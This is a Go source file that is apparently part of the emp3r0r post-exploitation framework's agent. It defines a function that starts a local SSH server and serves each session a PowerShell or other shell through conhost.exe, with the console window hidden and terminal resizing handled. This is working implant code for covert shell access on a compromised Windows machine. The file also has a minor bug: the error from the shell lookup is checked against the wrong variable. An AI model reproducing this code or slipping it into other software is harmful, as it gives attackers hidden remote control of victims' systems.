package agent

import (
	"context"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"syscall"

	"github.com/gliderlabs/ssh"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/shirou/gopsutil/v3/process"
)

// SSHD start a ssh server to provide shell access for clients
// the server binds local interface only
func crossPlatformSSHD(shell, port string, args []string) (err error) {
	if strings.HasSuffix(shell, "bash") {
		// to use conhost.exe, the target must be at least Windows 7
		// so it's safe to just set shell to powershell.exe
		shell = "powershell.exe"
	} else {
		exe, e := exec.LookPath(shell)
		if err != nil {
			err = fmt.Errorf("%s not found (%v)", shell, e)
			log.Print(err)
			return
		}
		shell = exe
	}
	log.Printf("Using %s shell", strconv.Quote(shell))
	args = append([]string{shell}, args...)

	ssh.Handle(func(s ssh.Session) {
		cmd := exec.Command("conhost.exe", args...) // shell command
		cmd.Env = os.Environ()
		cmd.Stderr = s
		cmd.Stdin = s
		cmd.Stdout = s

		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow: true,
		}
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()

		// console configs
		ptyReq, winCh, isPTY := s.Pty()
		if isPTY {
			log.Printf("Got an SSH PTY request: %s", ptyReq.Term)
			cmd.Env = append(cmd.Env, fmt.Sprintf("TERM=%s", ptyReq.Term))
		} else {
			log.Print("Got an SSH request")
		}
		go func() {
			defer cancel()
			for ctx.Err() == nil {
				if cmd.Process != nil {
					win := <-winCh
					conhost_pid := int32(cmd.Process.Pid)
					conhost_proc, err := process.NewProcess(conhost_pid)
					if err != nil {
						log.Printf("conhost process %d not found", conhost_pid)
						continue
					}
					children, err := conhost_proc.Children()
					if err != nil {
						log.Printf("conhost get children: %v", err)
						return
					}
					if len(children) == 0 {
						log.Print("conhost has no children, shell won't be resized")
						return
					}
					shell_proc := children[0] // there should be only 1 child
					SetCosoleWinsize(int(shell_proc.Pid), win.Width, win.Height)
				}
				util.TakeABlink()
			}
		}()

		err = cmd.Start()
		if err != nil {
			log.Printf("Start shell %s: %v", shell, err)
			return
		}
		err = cmd.Wait()
		if err != nil {
			log.Printf("Wait shell %s: %v", shell, err)
			return
		}
	})

	log.Printf("Starting SSHD on port %s...", port)
	return ssh.ListenAndServe("127.0.0.1:"+port, nil)
}
